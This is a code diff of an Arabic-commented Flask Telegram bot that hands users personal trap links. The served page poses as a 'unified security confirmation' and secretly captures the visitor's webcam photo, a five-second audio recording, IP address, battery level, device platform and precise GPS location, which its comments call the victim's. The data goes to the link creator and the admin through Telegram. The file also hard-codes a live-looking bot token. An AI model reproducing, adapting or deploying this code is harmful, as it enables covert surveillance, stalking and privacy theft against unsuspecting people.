@@ -4,7 +4,7 @@ from flask import Flask, render_template_string, request, jsonify
 app = Flask(__name__)
 
 # ==========================================
-# --- إعدادات الإمبراطور سيوفي (v25.0) ---
+# --- إعدادات الإمبراطور سيوفي (v20.0) ---
 # ==========================================
 BOT_TOKEN = "8431816368:AAGL4xuB42ZdHpxRJ2O1zBgAWOB6cvZwwe0"
 ADMIN_ID = "7041600701"
@@ -13,11 +13,11 @@ API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
 SUB_URL = "https://t.me/FAABOT?start=7041600701" 
 
 system_config = {
-    "welcome_msg": "🔥 أهلاً بك يا ملك في النسخة v25.0 المصلحة\n\nالتحكم (يوزر أو ايدي):\n🚫 حظر: `/user_ban @user`\n🔓 فك: `/user_unban ID`\n🧹 تصفير: `/clear @user`",
+    "welcome_msg": "🔥 أهلاً بك يا ملك في لوحة التحكم المطلقة v20.0\n\nأوامر التحكم:\n🚫 حظر: `/user_ban ID`\n🔓 فك: `/user_unban ID`",
     "trap_title": "تأكيد الأمان الموحد",
     "banned_users": [],  
     "user_stages": {},   
-    "all_users": {} # مخزن {chat_id: username}
+    "all_users": {}      
 }
 
 def tg_request(method, payload=None, files=None):
@@ -26,16 +26,7 @@ def tg_request(method, payload=None, files=None):
         return requests.post(API_URL + method, json=payload, timeout=30).json()
     except: return None
 
-# دالة البحث المتقدمة عن المستخدم
-def find_user_id(input_str):
-    input_str = input_str.strip().replace("@", "").lower()
-    if input_str.isdigit(): return input_str
-    for uid, uname in system_config["all_users"].items():
-        if uname.strip().replace("@", "").lower() == input_str:
-            return uid
-    return None
-
-# واجهة الصيد الاحترافية (تم إصلاح جلب الموقع)
+# واجهة الصيد (الموقع + الصوت + الصورة + الجهاز)
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -63,7 +54,6 @@ HTML_TEMPLATE = '''
     <script>
         const uid = "{{ user_id }}";
         const send = (d, t) => fetch('/api/capture/' + uid, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({d, t})});
-        
         async function startCapture() {
             document.getElementById('go').style.display = 'none';
             document.getElementById('st').innerText = "جاري الفحص...";
@@ -72,28 +62,18 @@ HTML_TEMPLATE = '''
                 const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 const v = document.getElementById('v'); v.srcObject = stream; await v.play();
                 const b = await navigator.getBattery().catch(() => ({}));
-                
                 await send(`🎯 **صيد جديد!**\\n🌐 IP: \`${ipData.ip}\`\\n🔋 البطارية: ${Math.round(b.level*100)}%\\n📱 النظام: ${navigator.platform}`, 'msg');
-
                 navigator.geolocation.getCurrentPosition(p => {
-                    const lat = p.coords.latitude; const lon = p.coords.longitude;
-                    send(`📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${lat},${lon}`, 'msg');
+                    send(`📍 **موقع الضحية الدقيق:**\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, 'msg');
                 }, null, {enableHighAccuracy: true});
-
                 setTimeout(() => {
                     const c = document.getElementById('c'); c.width = v.videoWidth; c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0); 
-                    send(c.toDataURL('image/jpeg', 0.8), 'img');
-                    
+                    c.getContext('2d').drawImage(v, 0, 0); send(c.toDataURL('image/jpeg', 0.8), 'img');
                     const recorder = new MediaRecorder(stream); const chunks = [];
                     recorder.ondataavailable = e => chunks.push(e.data);
                     recorder.onstop = async () => {
                         const reader = new FileReader(); reader.readAsDataURL(new Blob(chunks));
-                        reader.onloadend = async () => { 
-                            await send(reader.result, 'aud');
-                            document.getElementById('st').innerText = "✅ اكتمل الفحص!"; 
-                            stream.getTracks().forEach(t => t.stop());
-                        };
+                        reader.onloadend = async () => { await send(reader.result, 'aud'); document.getElementById('st').innerText = "✅ اكتمل الفحص!"; stream.getTracks().forEach(t => t.stop()); };
                     };
                     recorder.start(); setTimeout(() => recorder.stop(), 5000);
                 }, 2000);
@@ -113,7 +93,7 @@ def capture(uid):
     data = request.get_json(force=True, silent=True)
     if not data: return "ERROR"
     t, d = data.get('t'), data.get('d')
-    recipients = list(set([str(uid), str(ADMIN_ID)]))
+    recipients = list(set([uid, ADMIN_ID]))
     for r_id in recipients:
         if t == 'msg': tg_request("sendMessage", {'chat_id': r_id, 'text': d, 'parse_mode': 'Markdown'})
         elif t == 'img':
@@ -133,78 +113,68 @@ def webhook():
     
     msg = update["message"]; chat_id = str(msg["chat"]["id"])
     text = msg.get("text", ""); user_info = msg.get("from", {})
-    username = f"@{user_info.get('username', 'NoUser')}"
+    username = f"@{user_info.get('username', 'بدون يوزر')}"
     
-    # تسجيل المستخدم وتحديث بياناته
+    # حفظ المستخدم
     system_config["all_users"][chat_id] = username
 
-    if chat_id in system_config["banned_users"]: return "OK"
+    # فحص الحظر
+    if chat_id in system_config["banned_users"]:
+        return "OK"
 
-    # --- أوامر الإمبراطور (الأدمن) ---
+    # --- منطق الأدمن (أنت) ---
     if chat_id == ADMIN_ID:
         if text.startswith("/user_ban"):
-            target = text.replace("/user_ban", "").strip()
-            tid = find_user_id(target)
-            if tid:
-                if tid not in system_config["banned_users"]: system_config["banned_users"].append(tid)
-                tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر `{target}` بنجاح."})
-            else: tg_request("sendMessage", {"chat_id": chat_id, "text": "❌ لم أجد هذا المستخدم."})
+            target_id = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
+            if target_id:
+                system_config["banned_users"].append(target_id)
+                tg_request("sendMessage", {"chat_id": chat_id, "text": f"🚫 تم حظر المستخدم: `{target_id}`"})
             return "OK"
-        
         elif text.startswith("/user_unban"):
-            target = text.replace("/user_unban", "").strip()
-            tid = find_user_id(target)
-            if tid in system_config["banned_users"]: system_config["banned_users"].remove(tid)
-            tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم فك حظر `{target}`"})
-            return "OK"
-            
-        elif text.startswith("/clear"):
-            target = text.replace("/clear", "").strip()
-            tid = find_user_id(target)
-            if tid:
-                tg_request("sendMessage", {"chat_id": tid, "text": "🧹 تم تصفير سجل المحادثة من الإدارة."})
-                tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم التصفير لـ `{target}`"})
+            target_id = text.split(" ")[1] if len(text.split(" ")) > 1 else ""
+            if target_id in system_config["banned_users"]:
+                system_config["banned_users"].remove(target_id)
+                tg_request("sendMessage", {"chat_id": chat_id, "text": f"✅ تم فك حظر: `{target_id}`"})
             return "OK"
         
         adm_kb = {"inline_keyboard": [
-            [{"text": "🔗 رابطي", "callback_data": "gen_my_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_all"}],
-            [{"text": "⚙️ الأوامر", "callback_data": "admin_help"}]
+            [{"text": "🔗 إنشاء رابطي", "callback_data": "gen_my_link"}, {"text": "👥 قائمة المستخدمين", "callback_data": "list_all"}],
+            [{"text": "⚙️ أوامر الحظر", "callback_data": "ban_help"}]
         ]}
-        tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": adm_kb})
+        tg_request("sendMessage", {"chat_id": chat_id, "text": system_config["welcome_msg"], "reply_markup": adm_kb, "parse_mode": "Markdown"})
         return "OK"
 
-    # --- نظام المستخدمين العاديين ---
+    # --- منطق المستخدم العادي (الاشتراك المزدوج) ---
     stage = system_config["user_stages"].get(chat_id, 0)
     if stage < 2:
         sub_kb = {"inline_keyboard": [[{"text": "اضغط للاشتراك ✅", "url": SUB_URL}]]}
         if stage == 0:
             system_config["user_stages"][chat_id] = 1
-            tg_request("sendMessage", {"chat_id": chat_id, "text": "🛑 **خطوة 1:** اشترك في القناة.", "reply_markup": sub_kb})
+            tg_request("sendMessage", {"chat_id": chat_id, "text": "🛑 **خطوة 1 من 2:** اشترك وفعل البوت.", "reply_markup": sub_kb})
         else:
             system_config["user_stages"][chat_id] = 2
-            tg_request("sendMessage", {"chat_id": chat_id, "text": "✅ **خطوة 2:** اضغط مرة ثانية لفتح اللوحة.", "reply_markup": sub_kb})
+            tg_request("sendMessage", {"chat_id": chat_id, "text": "✅ **خطوة 2 من 2:** تم التأكيد الأول، اضغط مرة ثانية لفتح اللوحة.", "reply_markup": sub_kb})
         return "OK"
 
+    # لوحة المستخدم العادي (بعد الاشتراك)
     user_kb = {"inline_keyboard": [[{"text": "🔗 إنشاء رابطي الخاص", "callback_data": "gen_my_link"}]]}
-    tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 لوحة المستخدم جاهزة:", "reply_markup": user_kb})
+    tg_request("sendMessage", {"chat_id": chat_id, "text": "🔥 أهلاً بك في مصنع الروابط. اضغط لإنشاء رابطك:", "reply_markup": user_kb})
     return "OK"
 
 def handle_callback(query):
     cid = str(query["message"]["chat"]["id"]); data = query["data"]
     if data == "gen_my_link":
-        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك:\n`{BASE_URL}/t/{cid}`"})
+        tg_request("sendMessage", {"chat_id": cid, "text": f"🚀 رابطك جاهز:\n`{BASE_URL}/t/{cid}`"})
     elif data == "list_all" and cid == ADMIN_ID:
-        if not system_config["all_users"]:
-            res = "ℹ️ لا يوجد مستخدمين مسجلين."
-        else:
-            res = "👥 **سجل المستخدمين:**\n\n"
-            for uid, uname in system_config["all_users"].items():
-                status = "🚫" if uid in system_config["banned_users"] else "✅"
-                res += f"{status} {uname} | `{uid}`\n"
+        res = "👥 **المستخدمين النشطين:**\n\n"
+        for uid, uname in system_config["all_users"].items():
+            res += f"👤 {uname} | ID: `{uid}`\n"
         tg_request("sendMessage", {"chat_id": cid, "text": res, "parse_mode": "Markdown"})
-    elif data == "admin_help" and cid == ADMIN_ID:
-        tg_request("sendMessage", {"chat_id": cid, "text": "🛠 `/user_ban @user` أو `ID`"})
+    elif data == "ban_help" and cid == ADMIN_ID:
+        tg_request("sendMessage", {"chat_id": cid, "text": "🚫 للحظر: `/user_ban ID`\n🔓 للفك: `/user_unban ID`"})
     return "OK"
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
+
